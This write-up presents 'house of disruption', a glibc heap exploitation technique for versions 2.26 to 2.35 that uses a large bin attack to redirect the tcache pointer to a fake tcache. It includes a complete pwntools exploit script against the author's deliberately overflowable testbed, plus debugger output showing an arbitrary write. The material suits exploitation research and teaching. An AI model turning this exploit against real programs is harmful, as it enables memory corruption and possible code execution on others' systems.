# House of disruption
In this article I will describe a new powerful heap house I crafted which is applicable from glibc versions `2.26` until `2.35` (latest at the moment of writing this article). It's a pretty simple House but quite powerful with what you can do with it!

The main idea behind house of disruption is: by performing a simple large bin attack (which until 2.35 is unpatched) against `tcache` pointer, we can fool glibc into thinking that `tcache` is somewhere else on the heap. By crafting a fake tcache inside the large bin which `tcache` pointer is pointing to after the large bin attack, we can easily make `malloc` to return arbitrary chunks.

The only requirements for the house of disruption is a libc leak which we need inorder to locate the `tcache` pointer in memory and the ability to perform a large bin attack. Quite minimalistic isn't?

# Dive into malloc internals
For the house of disruption actually we just need to understand how tcache returns free tcache chunks back to the program.
```c
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");
  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
  --(tcache->counts[tc_idx]);
  e->key = 0;
  return (void *) e;
}
```
And this is actually pretty interesting. When you ask from malloc/realloc/calloc/etc a chunk in the tcache range (from `0x0` to `0x400` bytes), `malloc` will try to see if there is an available free tcache chunk in the range of your requested chunk. If it finds one it will call `tcache_get` to fetch a the free chunk and it will return it back to the program that requested this chunk.

The most important thing you have to consider is how ptmalloc2 locates the tcache on the heap. And as you can see above it uses a global variable named `tcache`. This variable will be our target for our large bin attack later.
```c
static __thread tcache_perthread_struct *tcache = NULL;
```
`tcache` is a per thread global variable and hence it is stored in the thread local storage of each thread. But for our single threaded program you can see it as a simple global variable which is **writable**.

Because ptmalloc2 blindly trusts this `tcache` pointer, if you are able to modify him to point somewhere you can write a fake `tcache` you will be able eventually to make ptmalloc2 to return arbitrary chunks back to the program!

For our case the only place we can craft a fake tcache is on the heap and so we will perform a large bin attack to put a heap address into the `tcache` pointer.

# Proof of Concept
For a proof of concept I will use the same testbed I used for another House that I made. You can find it [here]. If you remove the theme it's actually a simple testbed. In that testbed you have the ability to allocate chunks with a max size of `0x1000` bytes and you can free them if you wish. The bug in my testbed is a heap overflow of `40` bytes.

# Exploit for House of disruption.
```python
from pwn import *

elf = context.binary = ELF('house_of_disruption_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    else:
        return process(elf.path)

free_positions = [0,]*8

def select_option(option):
    io.sendlineafter(b'> ', str(option).encode())

def adjust_size(chunk_size): # copy pasted from HeapLABs ;)
    return (chunk_size & ~0x0f) - 8

def lock_position():
    for i in range(8):
        if free_positions[i] == 0:
            free_positions[i] = 1
            return i
    return -1

def unlock_position(pos):
    free_positions[pos] = 0
    
def malloc(size, contents):
    select_option(option = 1)
    io.sendlineafter(b'> ', hex(adjust_size(size)).encode())
    io.sendlineafter(b'> ', contents)
    return lock_position()

def free(index):
    select_option(option = 2)
    io.sendlineafter(b': ', str(index).encode())
    unlock_position(index)
    
def largebin_offset(address):
    return address - 0x20

def largebin_attack(target, fake_tcache_contents):
    largebin_target = largebin_offset(target)
    
    chunk_A = malloc(size = 0x820, contents=fake_tcache_contents) # after our large bin attack our new tcache will be here.
    chunk_B = malloc(size=0x70, contents=b'useful chunk') # this will take a guard chunk role also.
    chunk_C = malloc(size = 0x830, contents=b'Overflow me I will give you arbitrary chunks of many sizes!')
    chunk_guard = malloc(size = 0x40, contents=b'guard chunk')
    
    # Initiate our large bin attack.
    free(chunk_C) # free the biggest large chunk.
    
    # currently chunk 0x830 is linked in unsortedbin list, let's sort it to large bin list.
    sorter_chunk = malloc(size=0x840, contents=b'blah blah')
    free(chunk_A) # free the smallest large chunk.
    
    free(chunk_B) # we free this chunk inorder to overflow to chunk_C and hijack bk_nextsize pointer.
    
    chunk_B = malloc(size=0x70, contents=b'A'*0x60 + p64(0x0) + p64(0x830) + p64(0x0) + p64(0x0) + p64(0x0) + p64(largebin_target))
    # because we are sending also a newline we have to discard some output. Newline issues -.-
    io.recvuntil(b'Sorry you are not allowed to leave, you are my slave.\n')
    
    sorter_chunk = malloc(size=0x840, contents=b'blah blah') # now tcache must point back to our chunk_A!

def house_of_disruption():
    tcache_ref = libc.address - 0x2908
    
    # I will choose default_overflow_region as my target, you can choose any targets you like. Try to get a shell if you can ;)
    '''
        2a6:1530│       0x7faddbc4a530 (program_invocation_short_name) —▸ 0x7fff07c5ee08 ◂— 'house_of_disruption_patched'
        2a7:1538│       0x7faddbc4a538 (program_invocation_name) —▸ 0x7fff07c5eded ◂— '/home/un1c0rn/house_of_disruption/house_of_disruption_patched'
        2a8:1540│       0x7faddbc4a540 (default_overflow_region) ◂— 0x0
        2a9:1548│       0x7faddbc4a548 (default_overflow_region+8) ◂— 0x1
        2aa:1550│       0x7faddbc4a550 (default_overflow_region+16) ◂— 0x2
    '''
    
    target = libc.sym.default_overflow_region  # any target we like but we need it to be aligned to avoid tcache_get unaligned tcache mitigation!
    contents = p64(0xdeadbeef) + p64(0xcafebabe) + p64(0xbadc0de)

    # After our large bin attack our small large bin which now is our tcache will look like this:
    '''
        0x55ed6a059290:	0x0000000000000000	0x0000000000000821
        0x55ed6a0592a0:	0x00007f9ce80d41d0	0x000055ed6a059b20
        0x55ed6a0592b0:	0x000055ed6a059b20	0x00007f9ce7ede6d8
        0x55ed6a0592c0:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a0592d0:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a0592e0:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a0592f0:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a059300:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a059310:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a059320:	0x00000000deadbeef	0x00000000deadbeef
        0x55ed6a059330:	0x00000000deadbeef	0x00000000deadbeef
    '''
    
    # Our new tcache will start from 0x55ed6a059290.
    # So we can not control the first 6 qwords. (Except if we perform another heap overflow from an above crafted chunk or with a write after free). But it doesn't matter the top of the tcache is allocated for the counts.
    # Filling our small large bin with a special crafted fake tcache we can supply fake tcache bins and allocate whatever we want!
    
    '''
/* offset      |    size */  type = struct tcache_perthread_struct {
/* 0x0000      |  0x0080 */    uint16_t counts[64];
/* 0x0080      |  0x0200 */    tcache_entry *entries[64];

                            /* total size (bytes):  640 */
                            }
    '''
    
    fake_tcache_counts = p64(0)*4 + p64(0xffffffffffffffff)*10 # first 4 qwords are used for fd/bk/bk_nextsize/fd_nextsize and after our large bin attack whatever we place there will be overwritten
    fake_tcache_bins   = p64(target - 0x10)*0x80 # spray our target because I'm lazy to calculate simple stuff.
    
    fake_tcache = fake_tcache_counts + fake_tcache_bins
    
    largebin_attack(tcache_ref, fake_tcache)
    malloc(size = 0xe0, contents=p64(0x0)*2 + contents) # allocate our target and overwrite it with our contents :)
    
    success(f'See the contents of your target in the debugger ;)')
    success(f'Quick reminder your selected target was: 0x{target:02x}')
    
io = start()

io.recvuntil(b'@ The ASLR god gifted you a present for your adventure: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

house_of_disruption()

io.interactive()
```
Result:
```python
$ python3 exploit.py GDB
[+] puts @ 0x7ffbf8091e80
[+] libc @ 0x7ffbf8018000
[+] See the contents of your target in the debugger ;)
[+] Quick reminder your selected target was: 0x7ffbf820b540
[*] Switching to interactive mode

Press 1 to add a new pwnie land
Press 2 to burn your pwnie land
> $  
pwndbg> tel 0x7ffbf820b540
00:0000│  0x7ffbf820b540 (default_overflow_region) ◂— 0xdeadbeef
01:0008│  0x7ffbf820b548 (default_overflow_region+8) ◂— 0xcafebabe
02:0010│  0x7ffbf820b550 (default_overflow_region+16) ◂— 0xbadc0de
03:0018│  0x7ffbf820b558 (default_overflow_region+24) —▸ 0x7ffbf821000a (__pthread_keys+10314) ◂— 0x0
04:0020│  0x7ffbf820b560 (default_overflow_region+32) ◂— 0x0
05:0028│  0x7ffbf820b568 (default_overflow_region+40) ◂— 0xffffffffffffffff

```
